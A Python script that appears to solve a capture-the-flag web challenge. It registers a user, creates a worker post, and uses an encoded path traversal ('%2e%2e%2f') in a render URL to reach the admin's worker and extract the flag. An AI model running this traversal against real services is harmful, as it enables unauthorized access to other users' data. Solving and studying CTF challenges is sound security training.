#!/usr/bin/env python3

import requests
import re

URL = "https://workerboard-1-9a4bc65ff569.instances.ctf.l3ak.team"

s = requests.Session()


def register():
    r = s.post(
        f"{URL}/api/register",
        json={
            "username": "nata",
            "password": "nata"
        }
    )

    print("[+] Register:")
    print(r.json())


def login():
    r = s.post(
        f"{URL}/api/login",
        json={
            "username": "nata",
            "password": "nata"
        }
    )

    print("[+] Login:")
    print(r.json())


def get_posts():
    r = s.get(f"{URL}/api/posts")
    posts = r.json()

    admin = None

    for p in posts:
        if p["author_name"] == "admin":
            admin = p
            break

    if not admin:
        print("[-] Admin post not found")
        exit()

    print("[+] Admin post:")
    print(admin)

    return admin["id"]


def create_worker():
    payload = {
        "title": "exploit",
        "script": """
export default {
 async fetch(req){
    return new Response("owned")
 }
}
"""
    }

    r = s.post(
        f"{URL}/api/posts",
        json=payload
    )

    data = r.json()

    print("[+] Created worker:")
    print(data)

    return data["id"]


def exploit(my_id, admin_id):

    target = (
        f"{URL}/render/"
        f"{my_id}/%2e%2e%2f{admin_id}"
    )

    print("[+] Exploit URL:")
    print(target)

    r = s.get(target)

    print("[+] Response:")
    print(r.text)

    flag = re.search(
        r"L3AK\{.*?\}",
        r.text
    )

    if flag:
        print("\n[+] FLAG FOUND:")
        print(flag.group())


if __name__ == "__main__":

    register()
    login()

    admin_id = get_posts()

    my_id = create_worker()

    exploit(
        my_id,
        admin_id
    )
